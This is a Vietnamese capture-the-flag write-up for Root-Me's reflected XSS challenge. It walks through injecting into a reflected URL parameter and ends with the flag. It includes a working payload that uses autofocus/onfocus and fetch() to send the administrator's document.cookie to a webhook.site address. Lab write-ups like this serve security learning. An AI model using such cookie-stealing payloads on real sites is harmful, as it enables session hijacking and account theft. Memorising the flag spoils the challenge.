# XSS-Reflected
### Challenge
Link: http://challenge01.root-me.org/web-client/ch26/
### Solution
Đầu tiên, em kiểm tra các tính năng của trang web thì thấy ở trang `contact` có một form cho phép nhập thông tin.
Tuy nhiên lại có dòng:
>Like most businesses, nobody actually checks any of this feedback, but in order to look like we care, we have made a totally useless form you can fill out.`

Nghĩa là form này vô dụng. Em kiểm tra bằng cách nhập thông tin như sau:

![](https://i.imgur.com/j48yzGR.png)

Nhấn send thì không thấy có gì xảy ra, lại có đoạn 
>We have automatically printed out your feedback and burned it to provide our offices with warmth during the harsh Nordic winter
(seriously, nobody wants to read your rambling).`

Vậy nên form này vô dụng thật.
Để ý URL, em thấy có tham số `p` nhận giá trị là trang được truy cập tới. Thử thay đổi giá trị của `p` thì em được chuyển hướng tới trang sau:

![](https://i.imgur.com/CsdmpAT.png)

Thay đổi giá trị của `p` thành `' onclick='alert(1)` được URL encode thì được kết quả như sau:

![](https://i.imgur.com/qReFsgW.png)

Vậy ta có thể khai thác XSS từ đây.
Để lấy được cookie của admin, em fetch đến [Webhook](https://webhook.site/#!/16dfa276-986b-4d49-9ae0-8cca659780d1/a64570e2-7695-4bcc-ab94-fe084f9114b7/1) với payload `'autofocus onfocus='fetch(`https://webhook.site/16dfa276-986b-4d49-9ae0-8cca659780d1?cookie=${document.cookie}`)`

![](https://i.imgur.com/z7mwHeC.png)

Em đã chuyển hướng được đến trang [Webhook](https://webhook.site/#!/16dfa276-986b-4d49-9ae0-8cca659780d1/a64570e2-7695-4bcc-ab94-fe084f9114b7/1). Giờ em chỉ cần chọn`Report to administrator` rồi đợi kết quả từ Webhook.

![](https://i.imgur.com/RF3vLEQ.png)

### Flag
r3fL3ct3D_XsS_fTw
